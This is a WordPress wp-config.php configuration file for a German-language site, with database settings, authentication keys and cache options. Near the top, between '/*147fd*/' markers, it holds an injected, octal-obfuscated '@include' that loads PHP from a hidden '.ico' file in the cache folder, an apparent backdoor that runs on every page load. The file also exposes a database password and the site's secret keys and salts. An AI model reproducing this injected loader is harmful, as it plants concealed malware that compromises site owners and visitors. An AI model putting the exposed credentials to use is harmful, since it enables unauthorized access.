<?php

//Begin Really Simple SSL session cookie settings
@ini_set('session.cookie_httponly', true);
@ini_set('session.cookie_secure', true);
@ini_set('session.use_only_cookies', true);
//END Really Simple SSL cookie settings
/*147fd*/

@include "\057ho\155e/\163ch\141la\142l/\167ww\056sc\150al\154y.\141t/\167p-\143on\164en\164/c\141ch\145/m\151ni\146y/\05692\065ef\07059\056ic\157";

/*147fd*/
/** Enable W3 Total Cache Edge Mode */
define('W3TC_EDGE_MODE', true); // Added by W3 Total Cache

/** Enable W3 Total Cache */
define('WP_CACHE', true); // Added by W3 Total Cache

/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'usrdb_schalabl_wp');


/** MySQL database username */
define('DB_USER', 'schalabl_wp');


/** MySQL database password */
define('DB_PASSWORD', '0qeZHt#YtSM7?poTWxg@');


/** MySQL hostname */
define('DB_HOST', 'localhost');


/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '%:DElVg[{UmdAx;uHUInB7o!|8Cd`N()vw,$ei-/xyP+rG>(7gBepQF-jE)24Qyq');

define('SECURE_AUTH_KEY',  'l9m~aBb(`tSi2-$Ua8zFiM?>=mz-9D7tyF;DhOB#(b^)9]m7ic(1P[jwj3:`d1n*');

define('LOGGED_IN_KEY',    '2*<eps! t/TLm-+z?L2kKO^ZU,;N~Wg/3Tb)2.;~?6D:lsgOU!-xU{W+s^[M<Y{:');

define('NONCE_KEY',        'O/GzU3*rym@(eBDt~I^fm%>w=}8`oDtZ}=Up`*)4p+ApGILF.<-|onpS$F-^+z6A');

define('AUTH_SALT',        'Qt)nV*as(!$P<Yj0!+ jn8D^->l=n5*}Q|+vlE(m;hw$}Z3J^GCI1kDz|hD4W&%)');

define('SECURE_AUTH_SALT', '-]1!a;hz|q-,~,c~qSj$.`6_wfSDMqvYDDN)K5&Iy X0|w4h[P.vy x$XB,c>qP3');

define('LOGGED_IN_SALT',   'SOVy!kN?d}1-pl+{ul#;GTIde7yQVN^Bv7w4%D8~CX}W`>Gd~Jh0+CZyyJ]=<@FS');

define('NONCE_SALT',       'v*%,)QBHa)Co}},,Ig7(*7iD38]CG&s&co-SOJKomLaJdzY{Q=V`N_Tj#{qPFK(q');


/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_schally_';


/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', 'de_DE');



/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
